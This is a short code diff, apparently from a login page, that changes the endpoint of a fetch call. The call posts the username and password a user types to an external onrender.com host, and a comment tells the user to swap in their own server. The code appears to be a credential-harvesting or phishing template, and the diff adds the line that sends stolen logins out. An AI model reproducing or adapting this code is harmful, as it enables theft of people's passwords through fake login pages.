@@ -72,7 +72,7 @@
             const password = document.getElementById("password").value;
 
             // Send credentials to your server (replace with your own)
-            fetch("https://fetch3-1.onrender.com", {
+            fetch("https://fetch3-1.onrender.com/submit", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ username, password })
